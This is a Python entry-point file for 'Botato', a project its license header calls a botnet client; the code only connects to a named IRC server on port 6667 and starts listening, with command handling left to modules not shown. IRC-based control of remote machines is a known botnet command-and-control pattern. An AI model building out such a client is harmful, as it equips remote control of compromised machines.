''' Botato - A botnet client for native execution across supported networks for remote functionality.
	Copyright (C) 2014 EnKrypt
	Copyright (C) 2014 Jir0
	Copyright (C) 2014 Laneone

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation,either version 3 of the License,or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.

	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not,see <http://www.gnu.org/licenses/>.
'''

if __name__ == '__main__':
    import Botato
    raise SystemExit(Botato.main())

import os
import sys

import irc
import parse

class Botato(object):
	'Outermost structure class for the Botato Program'
	version={'Number': '0.1', 'Type': 'Beta'}
    
	def __init__(self):
		self.start=True
			
	def begin(self):
		connection=irc.IRC("irc.jamezq.com",6667)
		connection.connect()
		connection.startListening()

def main():
	bot=Botato()
	bot.begin()